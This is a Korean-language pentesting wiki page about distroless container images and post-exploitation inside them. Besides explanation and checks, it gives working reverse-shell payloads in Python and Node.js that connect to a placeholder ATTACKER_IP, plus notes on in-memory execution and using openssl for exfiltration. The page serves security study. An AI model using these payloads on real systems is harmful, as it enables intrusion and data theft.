# Distroless 컨테이너

{{#include ../../../banners/hacktricks-training.md}}

## 개요

**distroless** 컨테이너 이미지는 **특정 애플리케이션 하나를 실행하는 데 필요한 최소한의 runtime 구성 요소**만 포함하며, 패키지 관리자, shell, 다양한 범용 사용자 공간 유틸리티와 같은 일반적인 배포판 도구는 의도적으로 제거합니다. 실제로 distroless 이미지는 애플리케이션 바이너리나 runtime, 공유 라이브러리, 인증서 번들, 그리고 매우 간단한 파일 시스템 레이아웃만 포함하는 경우가 많습니다. <sup>[[1]](#references)</sup>

distroless는 새로운 kernel 격리 primitive가 아닙니다. distroless는 **이미지 설계 전략**입니다. 컨테이너를 격리하는 kernel 방식이 아니라 컨테이너 파일 시스템 **내부**에서 사용할 수 있는 항목을 바꿉니다. 이 차이가 중요한 이유는, distroless가 주로 공격자가 code execution을 얻은 뒤 사용할 수 있는 항목을 줄여 환경을 harden하기 때문입니다. namespaces, seccomp, capabilities, AppArmor, SELinux 또는 다른 runtime 격리 메커니즘을 대체하지는 않습니다.

## Distroless가 필요한 이유

distroless 이미지는 주로 다음 항목을 줄이는 데 사용됩니다.

- 이미지 크기
- 이미지의 운영 복잡성
- 취약점이 있을 수 있는 패키지와 바이너리의 수
- 기본적으로 공격자가 사용할 수 있는 post-exploitation 도구의 수

이 때문에 distroless 이미지는 프로덕션 애플리케이션 배포에서 인기가 높습니다. shell, 패키지 관리자, 범용 도구가 거의 없는 컨테이너는 일반적으로 운영 측면에서 파악하기 쉽고, 침해된 뒤 대화형으로 악용하기 어렵습니다.

잘 알려진 distroless 스타일 이미지 제품군의 예는 다음과 같습니다.

- Google의 distroless 이미지 <sup>[[1]](#references)</sup>
- Chainguard hardened/minimal 이미지 <sup>[[2]](#references)</sup>

## Distroless가 의미하지 않는 것

distroless 컨테이너라고 해서 다음을 의미하지는 **않습니다**.

- 자동으로 rootless 상태가 되는 것
- 자동으로 권한이 제한되는 것
- 자동으로 읽기 전용이 되는 것
- 자동으로 seccomp, AppArmor, SELinux의 보호를 받는 것
- 자동으로 컨테이너 escape로부터 안전해지는 것

distroless 이미지를 `--privileged`로 실행하거나, host namespace를 공유하거나, 위험한 bind mount를 사용하거나, runtime socket을 마운트할 수 있습니다. 이런 경우 이미지는 최소 구성일 수 있지만 컨테이너는 여전히 심각하게 안전하지 않을 수 있습니다. distroless는 **사용자 공간의 공격 표면**을 바꾸는 것이지, **kernel 신뢰 경계**를 바꾸는 것이 아닙니다.

## 일반적인 운영 특성

distroless 컨테이너를 침해하면 가장 먼저 흔히 알게 되는 것은 일반적인 전제가 더는 성립하지 않는다는 점입니다. `sh`, `bash`, `ls`, `id`, `cat`이 없을 수 있고, 때로는 평소의 tradecraft가 예상하는 방식으로 동작하는 libc 기반 환경조차 없을 수 있습니다. 도구가 부족하면 debugging, incident response, post-exploitation 방식이 달라지므로 이는 공격과 방어 모두에 영향을 줍니다.

가장 흔한 패턴은 다음과 같습니다.

- 애플리케이션 runtime은 있지만 그 외에는 거의 없음
- shell이 없어 shell 기반 payload가 실패함
- helper 바이너리가 없어 일반적인 enumeration 한 줄 명령이 실패함
- 읽기 전용 rootfs 또는 쓰기 가능한 tmpfs 위치의 `noexec` 등 파일 시스템 보호도 함께 적용된 경우가 많음

이 조합 때문에 보통 "distroless 무기화"라는 표현을 사용합니다.

## Distroless와 Post-Exploitation

distroless 환경에서 주요한 공격상의 어려움은 항상 초기 RCE에 있는 것은 아닙니다. 그 이후에 이어지는 과정에서 어려움이 생기는 경우가 많습니다. 침해된 workload에서 Python, Node.js, Java, Go와 같은 언어 runtime을 통해 code execution을 얻었다면 임의의 로직을 실행할 수 있을지 모릅니다. 하지만 다른 Linux 대상에서 흔히 사용하는 일반적인 shell 중심 workflow로 실행할 수는 없습니다.

따라서 post-exploitation은 흔히 다음 세 가지 방향 중 하나로 전환됩니다.

1. **기존 언어 runtime을 직접 사용해** 환경을 열거하고, socket을 열고, 파일을 읽거나, 추가 payload를 준비합니다.
2. 파일 시스템이 읽기 전용이거나 쓰기 가능한 위치가 `noexec`로 마운트되어 있다면 **도구를 메모리에 직접 가져옵니다**.
3. 애플리케이션이나 그 종속성에 예상외로 유용한 항목이 포함되어 있다면 **이미지에 있는 기존 바이너리를 악용합니다**.

## 악용

### 이미 사용할 수 있는 Runtime 열거

많은 distroless 컨테이너에는 shell이 없지만 애플리케이션 runtime은 여전히 있습니다. 대상이 Python 서비스라면 Python이 있습니다. 대상이 Node.js라면 Node가 있습니다. 이 runtime만으로도 `/bin/sh`를 전혀 실행하지 않고 파일을 열거하고, 환경 변수를 읽고, reverse shell을 열고, 메모리 내 실행을 준비할 수 있는 경우가 많습니다.

Python을 사용한 간단한 예시:

```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

Node.js를 사용한 간단한 예:

```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

Impact:

- 환경 변수 복구. 여기에는 자격 증명이나 서비스 엔드포인트가 포함되는 경우가 많음
- `/bin/ls` 없이 파일 시스템 열거
- 쓰기 가능한 경로와 마운트된 비밀 정보 식별

### `/bin/sh`가 없는 대화형 런타임

이미지에 `sh` 또는 `bash`가 없으면, 일반적인 셸 기반 reverse shell은 실패합니다. 이 경우 존재하지 않는 셸을 실행하는 대신 설치된 언어 런타임에서 대화형 세션을 노출합니다.

예를 들어, 다음 Python payload는 소켓을 통해 대화형 Python 콘솔을 리디렉션합니다:

```bash
python3 - <<'PY'
import code, socket, sys
s = socket.create_connection(("ATTACKER_IP", 4444))
stream = s.makefile("rw", buffering=1)
sys.stdin = sys.stdout = sys.stderr = stream
code.interact(local=globals())
PY
```

Node.js에서 이에 상응하는 방식은 소켓을 통해 받은 JavaScript를 평가할 수 있습니다. 이는 운영체제 셸이 아닌 JavaScript REPL입니다. 파일 시스템, 프로세스 및 네트워킹 작업은 Node의 API를 통해 수행해야 합니다:

```bash
node -e 'const net=require("net");const s=net.connect(4444,"ATTACKER_IP");s.on("data",d=>{try{s.write(String(eval(d.toString()))+"\n")}catch(e){s.write(String(e)+"\n")}});'
```

두 예제 모두 outbound connectivity와 사용 가능한 interpreter가 필요하며, 해당 interpreter가 제공하는 기능만 사용할 수 있습니다.

이미지에 예상치 못하게 `/bin/sh`가 포함되어 있다면, 기존의 interpreter-assisted shell payload도 여전히 유용합니다. 이는 실제로 shell-free가 아니므로 별도로 소개합니다:

```bash
# Python plus an existing /bin/sh
python3 - <<'PY'
import os, pty, socket
s = socket.create_connection(("ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
PY

# Node.js plus an existing /bin/sh
node -e 'const net=require("net"),cp=require("child_process");const s=net.connect(4444,"ATTACKER_IP",()=>{const p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```

이전 Python command-loop 패턴은 `/bin/sh`가 있지만 대화형 PTY를 사용하기 불편한 경우에도 유용합니다. 실제 의존성을 명시하여 여기에도 남겨 둡니다. `subprocess.run(..., shell=True)`는 시스템 셸을 호출하므로 **no-shell 기법이 아닙니다**.

```bash
python3 -c '
import subprocess
while True:
    cmd = input("sh> ")
    if cmd.strip() in ("exit", "quit"):
        break
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(result.stdout, end="")
    print(result.stderr, end="")
'
```

### 전체 예시: 셸 없는 Python 명령 루프

이미지에 Python은 있지만 셸이 전혀 없어도 로컬 Python REPL을 통해 파일 시스템, 환경 변수, 네트워크를 검사할 수 있습니다:

```bash
python3 - <<'PY'
namespace = {}
while True:
    source = input("py> ")
    if source.strip() in ("exit", "quit"):
        break
    try:
        result = eval(source, namespace)
        if result is not None:
            print(repr(result))
    except SyntaxError:
        exec(source, namespace)
PY
```

이 loop는 `/bin/sh`를 호출하지 않습니다. Python 표현식과 문을 직접 평가하므로, 작업에는 shell 명령이 아니라 Python API를 사용해야 합니다. 이러한 제약이 있지만, 기본적인 shell이 제공하는 기능 중 상당 부분은 여전히 수행할 수 있습니다. 예를 들면 파일 시스템과 환경 열거, 데이터 접근, 네트워크 활동, 설치된 runtime을 통한 추가 payload 스테이징 등이 있습니다.

### 메모리 내 Tool 실행

Distroless 이미지는 다음 설정과 함께 사용되는 경우가 많습니다.

- `readOnlyRootFilesystem: true`
- 쓰기는 가능하지만 `noexec`인 `/dev/shm` 같은 tmpfs
- 패키지 관리 도구 부재

이 조합에서는 일반적인 "binary를 디스크에 다운로드한 뒤 실행"하는 작업 흐름이 안정적으로 동작하지 않습니다. 이런 경우에는 메모리 실행 기법이 주된 해법이 됩니다.

이 내용은 전용 페이지에서 다룹니다.

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

가장 관련 있는 기법은 다음과 같습니다.

- scripting runtime을 통한 `memfd_create` + `execve` <sup>[[4]](#references)</sup>
- DDexec / EverythingExec
- memexec
- memdlopen

Python, Node.js 또는 PHP 서비스에서는 template injection, prototype pollution, unsafe evaluation 같은 애플리케이션 버그가 진입점이 될 수 있습니다. 이를 통해 프로세스 내부에서 code execution을 얻으면, `/proc/self/mem` 기법으로 shell이나 디스크의 executable file 없이 loader를 실행할 수 있습니다. 이는 여전히 container 프로세스의 identity로 실행됩니다. container escape를 위해서는 별도의 runtime 취약점이나 host 경계 취약점이 필요합니다. 사전 조건은 [read-only/noexec/distroless 기법](../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/README.md)을 참조하세요.

### 이미지에 이미 있는 Binary

일부 distroless 이미지에는 침해 후 유용하게 활용할 수 있는, 운영상 필요한 binary가 포함되어 있습니다. 자주 발견되는 예로는 `openssl`이 있습니다. 애플리케이션에서 암호화 또는 TLS 관련 작업에 이를 사용하는 경우가 있기 때문입니다.

빠르게 검색하려면 다음 패턴을 사용합니다.

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

`openssl`이 존재한다면 다음 용도로 사용할 수 있습니다.

- 아웃바운드 TLS 연결
- 허용된 egress 채널을 통한 data exfiltration
- 인코딩/암호화된 blob을 통한 payload 데이터 staging

구체적인 악용 방법은 실제로 설치된 항목에 따라 다르지만, 핵심은 distroless가 "도구가 전혀 없음"을 의미하는 게 아니라 "일반적인 배포판 이미지보다 도구가 훨씬 적음"을 의미한다는 점입니다.

## Checks

이러한 확인의 목적은 이미지가 실제로 distroless인지, 그리고 post-exploitation에 사용할 수 있는 runtime 또는 helper 바이너리가 무엇인지 파악하는 것입니다.

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```

여기서 흥미로운 점은 다음과 같습니다.

- shell은 없지만 Python이나 Node 같은 runtime이 있다면, post-exploitation 단계에서 runtime을 이용한 실행으로 전환해야 합니다.
- root 파일시스템은 읽기 전용이고 `/dev/shm`은 쓰기 가능하지만 `noexec`라면, 메모리 실행 기법이 훨씬 더 중요해집니다.
- `openssl`, `busybox`, `java` 같은 보조 바이너리가 있다면 추가 접근을 위한 기반을 마련하기에 충분한 기능을 제공할 수 있습니다.

## Runtime 기본값

| 이미지 / 플랫폼 유형 | 기본 상태 | 일반적인 동작 | 흔히 수동으로 보안을 약화시키는 방법 |
| --- | --- | --- | --- |
| Google distroless 스타일 이미지 | 설계상 최소한의 사용자 공간만 포함 | shell과 package manager가 없으며 애플리케이션/runtime 의존성만 포함 | 디버깅 레이어나 sidecar shell을 추가하거나, busybox 또는 도구를 복사해 넣음 |
| Chainguard minimal 이미지 | 설계상 최소한의 사용자 공간만 포함 | package 노출 범위를 줄이고, 대개 하나의 runtime 또는 서비스에 초점을 둠 | `:latest-dev` 또는 debug 변형을 사용하거나, 빌드 중 도구를 복사해 넣음 |
| distroless 이미지를 사용하는 Kubernetes workload | Pod 설정에 따라 다름 | distroless는 사용자 공간에만 영향을 줌. Pod의 보안 상태는 여전히 Pod spec과 runtime 기본값에 좌우됨 | ephemeral debug container, host mount, privileged Pod 설정을 추가함 |
| distroless 이미지를 실행하는 Docker / Podman | 실행 플래그에 따라 다름 | 파일시스템은 최소화되어 있지만, runtime 보안은 여전히 플래그와 daemon 설정에 좌우됨 | `--privileged`, host namespace 공유, runtime socket mount, 쓰기 가능한 host bind를 사용함 |

핵심은 distroless가 **이미지 속성**이지 runtime 보호 기능이 아니라는 점입니다. 그 가치는 침해 후 파일시스템 내에서 사용할 수 있는 항목을 줄이는 데 있습니다. 빌드 도구를 최종 이미지에 포함하지 않도록 하는 일반적인 방법으로 Multi-stage 빌드를 사용합니다. <sup>[[3]](#references)</sup>

## 관련 페이지

distroless 환경에서 흔히 필요한 파일시스템 및 메모리 실행 우회 기법:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

distroless workload에도 적용되는 컨테이너 runtime, socket, mount 악용 기법:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## References

- [1] [GoogleContainerTools - Distroless 컨테이너 이미지](https://github.com/GoogleContainerTools/distroless)
- [2] [Chainguard Images 문서](https://edu.chainguard.dev/chainguard/chainguard-images/)
- [3] [Docker Docs - Multi-stage 빌드](https://docs.docker.com/build/building/multi-stage/)
- [4] [`memfd_create(2)` - Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
{{#include ../../../banners/hacktricks-training.md}}
